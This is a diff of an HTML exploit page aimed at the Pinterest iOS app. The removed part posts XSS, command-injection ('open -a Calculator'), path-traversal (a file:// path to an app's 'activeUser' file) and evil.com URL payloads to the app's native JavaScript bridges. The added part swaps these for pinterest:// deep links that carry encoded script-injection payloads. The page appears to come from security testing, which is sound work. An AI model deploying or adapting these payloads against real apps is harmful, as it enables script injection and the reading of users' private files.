@@ -1,91 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Test JS Bridges Exploit</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      background: #f9f9f9;
-      padding: 20px;
-    }
-    h1 {
-      color: #333;
-    }
-    button {
-      display: block;
-      margin: 10px 0;
-      padding: 10px 15px;
-      font-size: 16px;
-      border: none;
-      background-color: #007AFF;
-      color: white;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #005BBB;
-    }
-  </style>
+  <title>Deep Link Exploit</title>
 </head>
 <body>
+  <h1>🎯 Pinterest Deep Link Exploit</h1>
+  
+  <!-- XSS-style injection inside query param -->
+  <a href="pinterest://search/xss%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert('PWNED')%3E?param=1">
+    Test XSS in Search Param
+  </a>
+  <br><br>
 
-  <h1>📡 Test JS -> Native Bridges (Exploit Attempt)</h1>
+  <!-- Working pin -->
+  <a href="pinterest://pin/813392382758771958">Open Pinterest Pin</a>
+  <br><br>
 
-  <button onclick="sendTargetAccountLinking()">🔗 TargetAccountLinkingInterfaceHandler (XSS)</button>
-  <button onclick="sendAmazonShop()">🛍️ AmazonShopExternalInterfaceHandler (Command Injection)</button>
-  <button onclick="sendPinImageOffScreen()">🖼️ PinImageOffScreenDetectionHandler (Path Traversal)</button>
-  <button onclick="sendPinmarkletCompletion()">📌 pinmarkletCompletionHandler (Malicious URL)</button>
+  <!-- Builder screen -->
+  <a href="pinterest://idea-pin-builder">Open Idea Pin Builder</a>
+  <br><br>
 
-  <script>
-    function sendTargetAccountLinking() {
-      try {
-        // نرسل نص فيه كود جافاسكريبت مشفر (XSS محاولة)
-        window.webkit.messageHandlers.TargetAccountLinkingInterfaceHandler.postMessage({
-         id: "\"><img src=x onerror=alert('XSS')>"
-        });
-        alert("✅ Sent XSS payload to TargetAccountLinkingInterfaceHandler");
-      } catch (e) {
-        alert("❌ Error: " + e.message);
-      }
-    }
-
-    function sendAmazonShop() {
-      try {
-        // محاولة حقن أمر (لو handler يسمح بتنفيذ أوامر)
-        window.webkit.messageHandlers.AmazonShopExternalInterfaceHandler.postMessage({
-          action: "execute",
-          command: "open -a Calculator"  // أو أي أمر ممكن ينفذه النيتف
-        });
-        alert("✅ Sent command injection payload to AmazonShopExternalInterfaceHandler");
-      } catch (e) {
-        alert("❌ Error: " + e.message);
-      }
-    }
-
-    function sendPinImageOffScreen() {
-      try {
-        // محاولة path traversal لقراءة ملفات حساسة
-        window.webkit.messageHandlers.PinImageOffScreenDetectionHandler.postMessage({
-          url: "file:///private/var/mobile/Containers/Data/Application/403983B1-9B7C-4405-BA97-B9581EBD7799/Documents/activeUser"
-        });
-        alert("✅ Sent path traversal payload to PinImageOffScreenDetectionHandler");
-      } catch (e) {
-        alert("❌ Error: " + e.message);
-      }
-    }
-
-    function sendPinmarkletCompletion() {
-      try {
-        // محاولة تمرير رابط خبيث (ممكن يستغل تحميل صور ضارة مثلا)
-        window.webkit.messageHandlers.pinmarkletCompletionHandler.postMessage({
-          imageUrl: "https://evil.com/malicious.jpg"
-        });
-        alert("✅ Sent malicious URL payload to pinmarkletCompletionHandler");
-      } catch (e) {
-        alert("❌ Error: " + e.message);
-      }
-    }
-  </script>
-
+  <!-- Merchant injection with encoded payload -->
+  <a href="pinterest://brand_catalog/?merchant=%3Cscript%3Ealert('PWNED')%3C%2Fscript%3E&pin_id=123">
+    Inject Merchant JS Payload
+  </a>
 </body>
 </html>
